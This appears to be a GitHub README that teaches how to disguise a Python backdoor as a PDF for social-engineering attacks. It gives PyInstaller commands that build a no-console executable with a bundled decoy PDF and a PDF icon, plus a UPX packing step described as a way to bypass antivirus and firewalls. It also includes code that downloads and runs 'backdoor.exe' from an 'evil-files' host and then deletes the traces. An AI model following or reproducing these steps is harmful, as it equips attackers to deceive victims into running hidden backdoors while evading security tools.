# FileCorruption-Social-Engineer-
From python file, to pdf or any file 

Taking "[Backdoor]Target" as main example, we're gonna explain how to convert .py files to executables or other files.

(Windows)

# pyinstaller.exe backdoor.py --onefile --noconsole -> executable file

(Linux)

1 - # wine pyinstaller.exe backdoor.py --onefile --noconsole -> executable file

2 - # wine pyinstaller.exe --add-data "/root/Downloads/example.pdf;." --onefile --noconsole backdoor.py

This one also requieres python modification, by adding:

	try:
   	   file_name = sys._MEIPASS + "example.pdf" 
	except Exception:
   	   file_name = os.path.abspath(".") + "example.pdf"

3 - # wine pyinstaller.exe --add-data "/root/Downlopads/example.pdf;." --onefile --noconsole --icon /root/Downloads/pdf.ico backdoor.py

4 - (Packaging the files to bypass antivirus and firewalls)
    cd /opt/upx
    ./upx /root/Desktop/Git\ Projects/Backdoor/\[Backdoor\]Target/AllInOne/dist/backdoor.exe -o compressed_backdoor.exe


Another example we can go through is "download_execute.py", where we modify the file to execute another download instead of reporting

Python modification:

	# Popen to continue the execution
	download("http://192.168.1.113/evil-files/sock.jpg")
	result = subprocess.Popen("sock.jpg", shell=True)
	
	# Call will pause and won't do anything till the hacker closes the bd
	download("htpp://192.168.1.113/evil-files/backdoor.exe")
	result = subprocess.call("backdoor.exe", shell=True)

	os.remove("sock.jpg")
	os.remove("backdoor.exe")
